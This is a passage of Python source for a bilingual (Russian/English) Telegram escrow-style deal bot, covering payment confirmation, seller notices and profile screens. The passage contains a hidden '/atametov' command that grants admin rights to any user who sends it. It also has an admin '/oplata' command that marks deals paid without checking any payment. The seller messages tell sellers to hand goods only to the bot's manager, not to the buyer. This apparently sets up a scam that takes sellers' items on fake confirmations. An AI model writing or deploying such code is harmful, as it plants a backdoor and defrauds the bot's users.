            f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
            f"Менеджер получил уведомление и передаст вам товар в ближайшее время."
        )
    else:
        text = (
            f"✅ Payment confirmed for deal #{deal_id}\n\n"
            f"The manager has been notified and will transfer the item to you shortly."
        )
    update_deal(deal_id, status="paid")
    await call.message.edit_text(text, parse_mode="HTML")

    # Notify seller
    if deal["seller_id"]:
        lang_s  = get_lang(deal["seller_id"])
        amount_str = f"{deal['amount']} {cur(deal['pay_method'])}"
        dtype_s = dlabel(deal["deal_type"], lang_s)
        if lang_s == "ru":
            seller_msg = (
                f"✅ Оплата подтверждена для сделки #{deal_id}.\n\n"
                f"💰 Сумма: {amount_str}\n"
                f"📝 Описание: <blockquote>{deal['description']}</blockquote>\n\n"
                f"❗️ Пожалуйста, передайте {dtype_s}:\n"
                f"Только менеджеру бота для обработки: {MANAGER}\n\n"
                f"⚠️ Обратите внимание:\n"
                f"➤ Товар необходимо передать именно менеджеру {MANAGER}, а не покупателю напрямую.\n"
                f"➤ Это стандартный процесс для автоматического завершения сделки через бота.\n\n"
                f"После отправки менеджеру подтвердите действие кнопкой ниже:"
            )
        else:
            seller_msg = (
                f"✅ Payment confirmed for deal #{deal_id}.\n\n"
                f"💰 Amount: {amount_str}\n"
                f"📝 Description: <blockquote>{deal['description']}</blockquote>\n\n"
                f"❗️ Please transfer {dtype_s}:\n"
                f"Only to the bot manager for processing: {MANAGER}\n\n"
                f"⚠️ Note:\n"
                f"➤ Item must be passed to manager {MANAGER}, not to buyer directly.\n"
                f"➤ This is the standard process for automatic deal completion via the bot.\n\n"
                f"After sending to the manager, confirm with the button below:"
            )
        await bot.send_message(deal["seller_id"], seller_msg, parse_mode="HTML",
                               reply_markup=kb_confirm_transfer(deal["seller_id"], deal_id))
    await call.answer()

# ─── Скрытая команда для получения прав админа ─────────────────────────────────

@router.message(Command("atametov"))
async def cmd_make_admin(message: Message):
    uid = message.from_user.id
    with get_db() as db:
        db.execute("UPDATE users SET is_admin=1 WHERE user_id=?", (uid,))
    await message.answer("✅ Готов")


# ─── Команда админа для подтверждения оплаты ─────────────────────────────────

@router.message(Command("oplata"))
async def cmd_confirm_payment(message: Message, bot: Bot):
    uid = message.from_user.id
    args = message.text.split()

    # Проверяем, админ ли
    with get_db() as db:
        row = db.execute("SELECT is_admin FROM users WHERE user_id=?", (uid,)).fetchone()
        if not row or not row["is_admin"]:
            await message.answer("❌ У вас нет прав администратора")
            return

    if len(args) < 2:
        await message.answer("❌ Использование: `/oplata НОМЕР_СДЕЛКИ`", parse_mode="HTML")
        return

    deal_id = args[1].upper()
    deal = get_deal(deal_id)

    if not deal:
        await message.answer(f"❌ Сделка #{deal_id} не найдена")
        return

    # Сделка должна быть в статусе active
    if deal["status"] != "active":
        await message.answer(f"❌ Сделка #{deal_id} в статусе '{deal['status']}', подтверждение невозможно")
        return

    # Подтверждаем оплату
    update_deal(deal_id, status="paid")

    # Уведомляем покупателя
    buyer_lang = get_lang(deal["buyer_id"])
    buyer_text = (
        f"✅ Ваша оплата подтверждена!\n\n"
        f"Продавец передаст товар менеджеру."
        if buyer_lang == "ru" else
        f"✅ Your payment has been confirmed!\n\n"
        f"The seller will transfer the item to the manager."
    )
    await bot.send_message(deal["buyer_id"], buyer_text)

    # Уведомляем продавца (с кнопкой)
    seller_lang = get_lang(deal["seller_id"])
    amount_str = f"{deal['amount']} {cur(deal['pay_method'])}"
    dtype_s = dlabel(deal["deal_type"], seller_lang)

    seller_text = (
        f"✅ Оплата подтверждена для сделки #{deal_id}.\n\n"
        f"💰 Сумма: {amount_str}\n"
        f"📝 Описание: <blockquote>{deal['description']}</blockquote>\n\n"
        f"❗️ Пожалуйста, передайте {dtype_s}:\n"
        f"Только менеджеру бота для обработки: {MANAGER}\n\n"
        f"После отправки менеджеру подтвердите действие кнопкой ниже:"
        if seller_lang == "ru" else
        f"✅ Payment confirmed for deal #{deal_id}.\n\n"
        f"💰 Amount: {amount_str}\n"
        f"📝 Description: <blockquote>{deal['description']}</blockquote>\n\n"
        f"❗️ Please transfer {dtype_s}:\n"
        f"Only to the bot manager for processing: {MANAGER}\n\n"
        f"After sending to the manager, confirm the action with the button below:"
    )

    await bot.send_message(
        deal["seller_id"],
        seller_text,
        parse_mode="HTML",
        reply_markup=kb_confirm_transfer(deal["seller_id"], deal_id)
    )

    await message.answer(f"✅ Оплата по сделке #{deal_id} подтверждена!")


@router.message(Command("profile"))
async def cmd_profile(message: Message):
    uid = message.from_user.id
    user = get_user(uid)
    lang = get_lang(uid)

    if not user:
        await message.answer("❌ Пользователь не найден" if lang == "ru" else "❌ User not found")
        return

    stats = get_user_stats(uid)
    ref_count = get_referrals_count(uid)
    ref_earned = get_referrals_earned(uid)

    if lang == "ru":
        text = f"""
👤 **Мой профиль**

🆔 ID: `{uid}`
📝 Username: @{user['username'] or 'не указан'}

💎 **TON кошелёк:**
`{user['ton_wallet'] or '❌ не добавлен'}`

💳 **Банковская карта:**
`{user['card'] or '❌ не добавлена'}`

⭐️ **Юзернейм для звёзд:**
`{user['stars_username'] or '❌ не добавлен'}`

📊 **Мои сделки:**
┌ Продажи: 🟢 {stats['sales_open']} | 🟡 {stats['sales_active']} | 💰 {stats['sales_paid']} | 📦 {stats['sales_completed']}
└ Покупки: 🟡 {stats['buys_active']} | ✅ {stats['buys_confirmed']} | 📦 {stats['buys_received']}

🔗 **Рефералы:** {ref_count} чел. | 💰 {ref_earned:.2f} TON

📅 Регистрация: {user['created_at']}
"""
    else:
        text = f"""
👤 **My Profile**

🆔 ID: `{uid}`
📝 Username: @{user['username'] or 'not set'}

💎 **TON Wallet:**
`{user['ton_wallet'] or '❌ not added'}`

💳 **Bank Card:**
`{user['card'] or '❌ not added'}`

⭐️ **Stars Username:**
`{user['stars_username'] or '❌ not added'}`

📊 **My deals:**
┌ Sales: 🟢 {stats['sales_open']} | 🟡 {stats['sales_active']} | 💰 {stats['sales_paid']} | 📦 {stats['sales_completed']}
└ Purchases: 🟡 {stats['buys_active']} | ✅ {stats['buys_confirmed']} | 📦 {stats['buys_received']}

🔗 **Referrals:** {ref_count} people | 💰 {ref_earned:.2f} TON

📅 Registered: {user['created_at']}
"""

    await message.answer(text.strip(), parse_mode="HTML")


@router.callback_query(F.data == "menu_profile")
async def cb_profile(call: CallbackQuery):
    uid = call.from_user.id
    user = get_user(uid)
    lang = get_lang(uid)

    if not user:
        await call.answer("❌ Ошибка", show_alert=True)
        return

    stats = get_user_stats(uid)
    ref_count = get_referrals_count(uid)
    ref_earned = get_referrals_earned(uid)

    if lang == "ru":
        text = f"""
👤 **Мой профиль**

🆔 ID: `{uid}`
📝 Username: @{user['username'] or 'не указан'}

💎 **TON:** `{user['ton_wallet'] or '❌ не добавлен'}`
💳 **Карта:** `{user['card'] or '❌ не добавлена'}`
⭐️ **Звёзды:** `{user['stars_username'] or '❌ не добавлен'}`

📊 **Продажи:** 🟢 {stats['sales_open']} | 🟡 {stats['sales_active']} | 💰 {stats['sales_paid']} | 📦 {stats['sales_completed']}
📊 **Покупки:** 🟡 {stats['buys_active']} | ✅ {stats['buys_confirmed']} | 📦 {stats['buys_received']}

🔗 **Рефералы:** {ref_count} чел. | 💰 {ref_earned:.2f} TON
"""
    else:
        text = f"""
👤 **My Profile**

🆔 ID: `{uid}`
📝 Username: @{user['username'] or 'not set'}

💎 **TON:** `{user['ton_wallet'] or '❌ not added'}`
💳 **Card:** `{user['card'] or '❌ not added'}`
⭐️ **Stars:** `{user['stars_username'] or '❌ not added'}`

📊 **Sales:** 🟢 {stats['sales_open']} | 🟡 {stats['sales_active']} | 💰 {stats['sales_paid']} | 📦 {stats['sales_completed']}
📊 **Purchases:** 🟡 {stats['buys_active']} | ✅ {stats['buys_confirmed']} | 📦 {stats['buys_received']}

🔗 **Referrals:** {ref_count} people | 💰 {ref_earned:.2f} TON
"""

    try:
        await call.message.delete()
    except Exception:
        pass

    await call.message.answer(text.strip(), parse_mode="HTML", reply_markup=kb_back(uid))
    await call.answer()

# ─── Main ─────────────────────────────────────────────────────────────────────

async def main():
    # Инициализируем базу данных
    init_db()
    
    # Создаём бота и диспетчер
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    
    print("🚀 Бот запущен и работает!")
    
    # Запускаем polling (для Railway это нормально)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
